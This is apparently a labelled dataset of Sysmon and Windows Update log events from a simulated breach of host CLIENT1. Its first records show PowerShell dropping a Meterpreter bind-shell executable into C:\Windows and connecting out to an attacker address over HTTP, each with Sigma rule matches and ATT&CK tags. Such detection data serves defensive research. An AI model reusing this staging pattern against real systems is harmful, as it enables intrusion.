{"event": {"@timestamp": "2022-12-19T10:08:07.903Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "File created (rule: FileCreate)", "category": ["file"], "code": 11, "created": "2022-12-19T10:08:08.313Z", "kind": "event", "module": "sysmon", "provider": "Microsoft-Windows-Sysmon", "type": ["creation"]}, "file": {"directory": "C:\\Windows", "extension": "exe", "name": "meterpreter_bind_tcp.exe", "path": "C:\\Windows\\meterpreter_bind_tcp.exe"}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "information"}, "message": "File created:\nRuleName: EXE\nUtcTime: 2022-12-19 10:08:07.903\nProcessGuid: {4901c233-3806-63a0-5d07-000000000600}\nProcessId: 3036\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetFilename: C:\\Windows\\meterpreter_bind_tcp.exe\nCreationUtcTime: 2022-12-19 10:08:07.903\nUser: CLIENT1\\ssh", "process": {"entity_id": "{4901c233-3806-63a0-5d07-000000000600}", "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "name": "powershell.exe", "pid": 3036}, "rule": {"name": "EXE"}, "winlog": {"api": "wineventlog", "channel": "Microsoft-Windows-Sysmon/Operational", "computer_name": "CLIENT1.breach.local", "event_data": {"CreationUtcTime": "2022-12-19 10:08:07.903", "User": "CLIENT1\\ssh"}, "event_id": 11, "opcode": "Info", "process": {"pid": 2072, "thread": {"id": 2684}}, "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "provider_name": "Microsoft-Windows-Sysmon", "record_id": 4647, "task": "File created (rule: FileCreate)", "user": {"domain": "NT AUTHORITY", "identifier": "S-1-5-18", "name": "SYSTEM", "type": "User"}, "version": 2}}, "rule": {"name": "Creation of an Executable by an Executable", "authors": ["frack113"], "level": "low", "source": "sigma", "status": "experimental", "falsepositives": ["Software installers", "Update utilities"], "id": "297afac9-5d02-4138-8c58-b977bac60556", "logsource": {"category": "file_event", "product": "windows"}, "references": ["Malware Sandbox"], "tags": ["attack.resource_development", "attack.t1587.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.903+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.939Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "destination": {"domain": "-", "ip": "172.18.1.1", "port": 80}, "ecs": {"version": "1.5.0"}, "event": {"action": "Network connection detected (rule: NetworkConnect)", "category": ["network"], "code": 3, "created": "2022-12-19T10:08:10.317Z", "kind": "event", "module": "sysmon", "provider": "Microsoft-Windows-Sysmon", "type": ["connection", "start", "protocol"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "information"}, "message": "Network connection detected:\nRuleName: -\nUtcTime: 2022-12-19 10:08:07.939\nProcessGuid: {4901c233-3806-63a0-5d07-000000000600}\nProcessId: 3036\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nUser: CLIENT1\\ssh\nProtocol: tcp\nInitiated: true\nSourceIsIpv6: false\nSourceIp: 172.16.1.1\nSourceHostname: CLIENT1.breach.local\nSourcePort: 54443\nSourcePortName: -\nDestinationIsIpv6: false\nDestinationIp: 172.18.1.1\nDestinationHostname: -\nDestinationPort: 80\nDestinationPortName: http", "network": {"community_id": "1:ATgMEjbE3Id0DO3liQuRpB953EM=", "direction": "outbound", "protocol": "http", "transport": "tcp", "type": "ipv4"}, "process": {"entity_id": "{4901c233-3806-63a0-5d07-000000000600}", "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "name": "powershell.exe", "pid": 3036}, "related": {"ip": ["172.16.1.1", "172.18.1.1"], "user": "ssh"}, "source": {"domain": "CLIENT1.breach.local", "ip": "172.16.1.1", "port": 54443}, "user": {"domain": "CLIENT1", "name": "ssh"}, "winlog": {"api": "wineventlog", "channel": "Microsoft-Windows-Sysmon/Operational", "computer_name": "CLIENT1.breach.local", "event_data": {"RuleName": "-", "SourcePortName": "-"}, "event_id": 3, "opcode": "Info", "process": {"pid": 2072, "thread": {"id": 2576}}, "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "provider_name": "Microsoft-Windows-Sysmon", "record_id": 4649, "task": "Network connection detected (rule: NetworkConnect)", "user": {"domain": "NT AUTHORITY", "identifier": "S-1-5-18", "name": "SYSTEM", "type": "User"}, "version": 5}}, "rule": {"name": "Cleartext Protocol Usage", "authors": ["Alexandr Yampolskyi", "SOC Prime"], "level": "low", "source": "sigma", "status": "stable", "falsepositives": ["Unknown"], "id": "7e4bfe58-4a47-4709-828d-d86c78b7cc1f", "logsource": {"service": "netflow"}, "references": ["https://www.cisecurity.org/controls/cis-controls-list/", "https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf", "https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.939+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1071.001"]}, "comment": "Malicious binary communicating with attacker over http. [Application Layer Protocol: Web Protocols]"}}
{"event": {"@timestamp": "2022-12-19T10:08:31.402Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Windows Update Agent", "code": 19, "created": "2022-12-19T10:08:31.721Z", "kind": "event", "provider": "Microsoft-Windows-WindowsUpdateClient"}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "information"}, "message": "Installation Successful: Windows successfully installed the following update: 9NZKPSTSNW4P-Microsoft.XboxGamingOverlay", "winlog": {"activity_id": "{1ff30d06-1386-0000-0b97-f41f8613d901}", "api": "wineventlog", "channel": "System", "computer_name": "CLIENT1.breach.local", "event_data": {"serviceGuid": "{855e8a7c-ecb4-4ca3-b045-1dfa50104289}", "updateGuid": "{3c9c28ee-fe5e-4175-b62d-ba56c53c529e}", "updateRevisionNumber": "1", "updateTitle": "9NZKPSTSNW4P-Microsoft.XboxGamingOverlay"}, "event_id": 19, "keywords": ["Installation", "Success"], "opcode": "Installation", "process": {"pid": 356, "thread": {"id": 4888}}, "provider_guid": "{945a8954-c147-4acd-923f-40c45405a658}", "provider_name": "Microsoft-Windows-WindowsUpdateClient", "record_id": 910, "task": "Windows Update Agent", "user": {"domain": "NT AUTHORITY", "identifier": "S-1-5-18", "name": "SYSTEM", "type": "User"}, "version": 1}}, "rule": {"name": "WMI Event Subscription", "authors": ["Tom Ueltschi (@c_APT_ure)"], "level": "medium", "source": "sigma", "status": "experimental", "falsepositives": ["Exclude legitimate (vetted) use of WMI event subscription in your network"], "id": "0f06a3a5-6a09-413f-8743-e6cf35561297", "logsource": {"category": "wmi_event", "product": "windows"}, "tags": ["attack.persistence", "attack.t1546.003"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:31.402+00:00", "misuse": false}}
{"event": {"@timestamp": "2022-12-19T10:08:59.017Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Windows Update Agent", "code": 19, "created": "2022-12-19T10:09:00.224Z", "kind": "event", "provider": "Microsoft-Windows-WindowsUpdateClient"}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "information"}, "message": "Installation Successful: Windows successfully installed the following update: 9WZDNCRFHVQM-MICROSOFT.WINDOWSCOMMUNICATIONSAPPS", "winlog": {"activity_id": "{1ff30d06-1386-0001-e861-f41f8613d901}", "api": "wineventlog", "channel": "System", "computer_name": "CLIENT1.breach.local", "event_data": {"serviceGuid": "{855e8a7c-ecb4-4ca3-b045-1dfa50104289}", "updateGuid": "{1f4c0377-123c-4f93-9df6-7429b894dd51}", "updateRevisionNumber": "1", "updateTitle": "9WZDNCRFHVQM-MICROSOFT.WINDOWSCOMMUNICATIONSAPPS"}, "event_id": 19, "keywords": ["Installation", "Success"], "opcode": "Installation", "process": {"pid": 356, "thread": {"id": 6928}}, "provider_guid": "{945a8954-c147-4acd-923f-40c45405a658}", "provider_name": "Microsoft-Windows-WindowsUpdateClient", "record_id": 925, "task": "Windows Update Agent", "user": {"domain": "NT AUTHORITY", "identifier": "S-1-5-18", "name": "SYSTEM", "type": "User"}, "version": 1}}, "rule": {"name": "WMI Event Subscription", "authors": ["Tom Ueltschi (@c_APT_ure)"], "level": "medium", "source": "sigma", "status": "experimental", "falsepositives": ["Exclude legitimate (vetted) use of WMI event subscription in your network"], "id": "0f06a3a5-6a09-413f-8743-e6cf35561297", "logsource": {"category": "wmi_event", "product": "windows"}, "tags": ["attack.persistence", "attack.t1546.003"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:59.017+00:00", "misuse": false}}
{"event": {"@timestamp": "2022-12-19T10:09:00.963Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Windows Update Agent", "code": 19, "created": "2022-12-19T10:09:02.232Z", "kind": "event", "provider": "Microsoft-Windows-WindowsUpdateClient"}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "information"}, "message": "Installation Successful: Windows successfully installed the following update: 9WZDNCRFJBMP-MICROSOFT.WINDOWSSTORE", "winlog": {"activity_id": "{1ff30d06-1386-0001-f261-f41f8613d901}", "api": "wineventlog", "channel": "System", "computer_name": "CLIENT1.breach.local", "event_data": {"serviceGuid": "{855e8a7c-ecb4-4ca3-b045-1dfa50104289}", "updateGuid": "{b6927b2a-f9cb-4da0-a1cd-a740e3481871}", "updateRevisionNumber": "1", "updateTitle": "9WZDNCRFJBMP-MICROSOFT.WINDOWSSTORE"}, "event_id": 19, "keywords": ["Installation", "Success"], "opcode": "Installation", "process": {"pid": 356, "thread": {"id": 5452}}, "provider_guid": "{945a8954-c147-4acd-923f-40c45405a658}", "provider_name": "Microsoft-Windows-WindowsUpdateClient", "record_id": 929, "task": "Windows Update Agent", "user": {"domain": "NT AUTHORITY", "identifier": "S-1-5-18", "name": "SYSTEM", "type": "User"}, "version": 1}}, "rule": {"name": "WMI Event Subscription", "authors": ["Tom Ueltschi (@c_APT_ure)"], "level": "medium", "source": "sigma", "status": "experimental", "falsepositives": ["Exclude legitimate (vetted) use of WMI event subscription in your network"], "id": "0f06a3a5-6a09-413f-8743-e6cf35561297", "logsource": {"category": "wmi_event", "product": "windows"}, "tags": ["attack.persistence", "attack.t1546.003"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:09:00.963+00:00", "misuse": false}}
{"event": {"@timestamp": "2022-12-19T10:09:07.663Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Windows Update Agent", "code": 19, "created": "2022-12-19T10:09:09.304Z", "kind": "event", "provider": "Microsoft-Windows-WindowsUpdateClient"}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "information"}, "message": "Installation Successful: Windows successfully installed the following update: 9WZDNCRFJ364-MICROSOFT.SKYPEAPP", "winlog": {"activity_id": "{1ff30d06-1386-0000-e097-f41f8613d901}", "api": "wineventlog", "channel": "System", "computer_name": "CLIENT1.breach.local", "event_data": {"serviceGuid": "{855e8a7c-ecb4-4ca3-b045-1dfa50104289}", "updateGuid": "{459d45bf-9cd6-4cc0-b4a7-524474c01972}", "updateRevisionNumber": "1", "updateTitle": "9WZDNCRFJ364-MICROSOFT.SKYPEAPP"}, "event_id": 19, "keywords": ["Installation", "Success"], "opcode": "Installation", "process": {"pid": 356, "thread": {"id": 3684}}, "provider_guid": "{945a8954-c147-4acd-923f-40c45405a658}", "provider_name": "Microsoft-Windows-WindowsUpdateClient", "record_id": 938, "task": "Windows Update Agent", "user": {"domain": "NT AUTHORITY", "identifier": "S-1-5-18", "name": "SYSTEM", "type": "User"}, "version": 1}}, "rule": {"name": "WMI Event Subscription", "authors": ["Tom Ueltschi (@c_APT_ure)"], "level": "medium", "source": "sigma", "status": "experimental", "falsepositives": ["Exclude legitimate (vetted) use of WMI event subscription in your network"], "id": "0f06a3a5-6a09-413f-8743-e6cf35561297", "logsource": {"category": "wmi_event", "product": "windows"}, "tags": ["attack.persistence", "attack.t1546.003"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:09:07.663+00:00", "misuse": false}}
{"event": {"@timestamp": "2022-12-19T10:09:28.898Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Windows Update Agent", "code": 19, "created": "2022-12-19T10:09:30.618Z", "kind": "event", "provider": "Microsoft-Windows-WindowsUpdateClient"}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "information"}, "message": "Installation Successful: Windows successfully installed the following update: 9WZDNCRFJ3PT-MICROSOFT.ZUNEMUSIC", "winlog": {"activity_id": "{1ff30d06-1386-0001-d062-f41f8613d901}", "api": "wineventlog", "channel": "System", "computer_name": "CLIENT1.breach.local", "event_data": {"serviceGuid": "{855e8a7c-ecb4-4ca3-b045-1dfa50104289}", "updateGuid": "{0ce12792-2b85-4f73-887e-d37dad5094cc}", "updateRevisionNumber": "1", "updateTitle": "9WZDNCRFJ3PT-MICROSOFT.ZUNEMUSIC"}, "event_id": 19, "keywords": ["Installation", "Success"], "opcode": "Installation", "process": {"pid": 356, "thread": {"id": 1636}}, "provider_guid": "{945a8954-c147-4acd-923f-40c45405a658}", "provider_name": "Microsoft-Windows-WindowsUpdateClient", "record_id": 963, "task": "Windows Update Agent", "user": {"domain": "NT AUTHORITY", "identifier": "S-1-5-18", "name": "SYSTEM", "type": "User"}, "version": 1}}, "rule": {"name": "WMI Event Subscription", "authors": ["Tom Ueltschi (@c_APT_ure)"], "level": "medium", "source": "sigma", "status": "experimental", "falsepositives": ["Exclude legitimate (vetted) use of WMI event subscription in your network"], "id": "0f06a3a5-6a09-413f-8743-e6cf35561297", "logsource": {"category": "wmi_event", "product": "windows"}, "tags": ["attack.persistence", "attack.t1546.003"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:09:28.898+00:00", "misuse": false}}
{"event": {"@timestamp": "2022-12-19T10:09:31.924Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Windows Update Agent", "code": 19, "created": "2022-12-19T10:09:33.650Z", "kind": "event", "provider": "Microsoft-Windows-WindowsUpdateClient"}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "information"}, "message": "Installation Successful: Windows successfully installed the following update: 9WZDNCRFHVN5-MICROSOFT.WINDOWSCALCULATOR", "winlog": {"activity_id": "{1ff30d06-1386-0001-f262-f41f8613d901}", "api": "wineventlog", "channel": "System", "computer_name": "CLIENT1.breach.local", "event_data": {"serviceGuid": "{855e8a7c-ecb4-4ca3-b045-1dfa50104289}", "updateGuid": "{106483e5-ee53-43c5-a82e-91e335a093de}", "updateRevisionNumber": "1", "updateTitle": "9WZDNCRFHVN5-MICROSOFT.WINDOWSCALCULATOR"}, "event_id": 19, "keywords": ["Installation", "Success"], "opcode": "Installation", "process": {"pid": 356, "thread": {"id": 5268}}, "provider_guid": "{945a8954-c147-4acd-923f-40c45405a658}", "provider_name": "Microsoft-Windows-WindowsUpdateClient", "record_id": 970, "task": "Windows Update Agent", "user": {"domain": "NT AUTHORITY", "identifier": "S-1-5-18", "name": "SYSTEM", "type": "User"}, "version": 1}}, "rule": {"name": "WMI Event Subscription", "authors": ["Tom Ueltschi (@c_APT_ure)"], "level": "medium", "source": "sigma", "status": "experimental", "falsepositives": ["Exclude legitimate (vetted) use of WMI event subscription in your network"], "id": "0f06a3a5-6a09-413f-8743-e6cf35561297", "logsource": {"category": "wmi_event", "product": "windows"}, "tags": ["attack.persistence", "attack.t1546.003"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:09:31.924+00:00", "misuse": false}}
{"event": {"@timestamp": "2022-12-19T10:09:37.281Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Windows Update Agent", "code": 19, "created": "2022-12-19T10:09:38.734Z", "kind": "event", "provider": "Microsoft-Windows-WindowsUpdateClient"}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "information"}, "message": "Installation Successful: Windows successfully installed the following update: 9WZDNCRFJ3PR-MICROSOFT.WINDOWSALARMS", "winlog": {"activity_id": "{1ff30d06-1386-0001-3d63-f41f8613d901}", "api": "wineventlog", "channel": "System", "computer_name": "CLIENT1.breach.local", "event_data": {"serviceGuid": "{855e8a7c-ecb4-4ca3-b045-1dfa50104289}", "updateGuid": "{91aa0bbc-2b6b-496c-98e6-4c0d82421472}", "updateRevisionNumber": "1", "updateTitle": "9WZDNCRFJ3PR-MICROSOFT.WINDOWSALARMS"}, "event_id": 19, "keywords": ["Installation", "Success"], "opcode": "Installation", "process": {"pid": 356, "thread": {"id": 3432}}, "provider_guid": "{945a8954-c147-4acd-923f-40c45405a658}", "provider_name": "Microsoft-Windows-WindowsUpdateClient", "record_id": 981, "task": "Windows Update Agent", "user": {"domain": "NT AUTHORITY", "identifier": "S-1-5-18", "name": "SYSTEM", "type": "User"}, "version": 1}}, "rule": {"name": "WMI Event Subscription", "authors": ["Tom Ueltschi (@c_APT_ure)"], "level": "medium", "source": "sigma", "status": "experimental", "falsepositives": ["Exclude legitimate (vetted) use of WMI event subscription in your network"], "id": "0f06a3a5-6a09-413f-8743-e6cf35561297", "logsource": {"category": "wmi_event", "product": "windows"}, "tags": ["attack.persistence", "attack.t1546.003"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:09:37.281+00:00", "misuse": false}}
{"event": {"@timestamp": "2022-12-19T10:09:50.336Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Windows Update Agent", "code": 19, "created": "2022-12-19T10:09:51.021Z", "kind": "event", "provider": "Microsoft-Windows-WindowsUpdateClient"}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "information"}, "message": "Installation Successful: Windows successfully installed the following update: 9PKRS2FVRWBT-Microsoft.UI.Xaml.2.3", "winlog": {"activity_id": "{1ff30d06-1386-0000-6b99-f41f8613d901}", "api": "wineventlog", "channel": "System", "computer_name": "CLIENT1.breach.local", "event_data": {"serviceGuid": "{855e8a7c-ecb4-4ca3-b045-1dfa50104289}", "updateGuid": "{3c209796-523b-410f-a0b5-9c7df78138dc}", "updateRevisionNumber": "1", "updateTitle": "9PKRS2FVRWBT-Microsoft.UI.Xaml.2.3"}, "event_id": 19, "keywords": ["Installation", "Success"], "opcode": "Installation", "process": {"pid": 356, "thread": {"id": 3196}}, "provider_guid": "{945a8954-c147-4acd-923f-40c45405a658}", "provider_name": "Microsoft-Windows-WindowsUpdateClient", "record_id": 995, "task": "Windows Update Agent", "user": {"domain": "NT AUTHORITY", "identifier": "S-1-5-18", "name": "SYSTEM", "type": "User"}, "version": 1}}, "rule": {"name": "WMI Event Subscription", "authors": ["Tom Ueltschi (@c_APT_ure)"], "level": "medium", "source": "sigma", "status": "experimental", "falsepositives": ["Exclude legitimate (vetted) use of WMI event subscription in your network"], "id": "0f06a3a5-6a09-413f-8743-e6cf35561297", "logsource": {"category": "wmi_event", "product": "windows"}, "tags": ["attack.persistence", "attack.t1546.003"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:09:50.336+00:00", "misuse": false}}
